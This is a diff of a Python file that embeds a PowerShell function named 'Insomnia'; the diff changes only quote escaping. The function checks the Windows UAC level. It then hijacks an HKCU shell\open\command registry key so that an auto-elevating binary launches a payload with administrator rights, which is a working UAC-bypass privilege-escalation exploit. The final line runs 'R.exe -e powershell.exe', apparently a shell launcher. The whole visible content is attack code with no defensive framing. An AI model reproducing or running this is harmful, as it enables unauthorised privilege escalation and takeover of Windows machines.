@@ -1,41 +1,41 @@
 import subprocess, sys
 from io import StringIO
 
-code ='''
+code ="""
 function Insomnia{
 	[CmdletBinding()]
-	param([string]$payload='powershell.exe')
+	param([string]$payload=\'powershell.exe\')
 
     #Get Windows Version
     $ver = [System.Environment]::OSVersion.Version.Major
 
 	#Get UAC Level
-	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+	$key = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"
 	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin
 
-	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='powershell.exe'){
-		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
+	function Add-RegKey([string]$key, [string]$exploit, [string]$payload=\'powershell.exe\'){
+		$regPath = \"HKCU:\\Software\\Classes\\$key\\shell\\open\\command\"
 		New-Item $regPath -Force
-		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
-		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
+		New-ItemProperty $regPath -Name \"DelegateExecute\" -Value $null -Force
+		Set-ItemProperty $regPath -Name \"(default)\" -Value $payload -Force
 		Start-Process $exploit
 		Start-Sleep -s 5
 		Remove-Item $regPath -Force -Recurse
 	}
 
 	if ($uac -eq 2) {
-		$UAC_LEVEL = 'High'
+		$UAC_LEVEL = \'High\'
 	} elseif ($uac -eq 0) {
-		$UAC_LEVEL = 'None'
+		$UAC_LEVEL = \'None\'
 	} elseif ($uac -eq 5) {
-		$UAC_LEVEL = 'Default'
+		$UAC_LEVEL = \'Default\'
 	} else {
-		$UAC_LEVEL = 'Unknown'
+		$UAC_LEVEL = \'Unknown\'
 	}
 
-	if ($UAC_LEVEL -eq "High") {
+	if ($UAC_LEVEL -eq \"High\") {
 		exit
-	} elseif ($UAC_LEVEL -eq "None") {
+	} elseif ($UAC_LEVEL -eq \"None\") {
 		Start-Process -FilePath $payload -verb runas
 	} else {
 		if ($ver -eq 10) {
@@ -45,8 +45,8 @@ function Insomnia{
 		}
 	}
 }
-Insomnia "C:\Users\$env:username\R.exe -e powershell.exe"
-'''
+Insomnia \"C:\\Users\\$env:username\\R.exe -e powershell.exe\"
+"""
 
 file = StringIO(code)
 
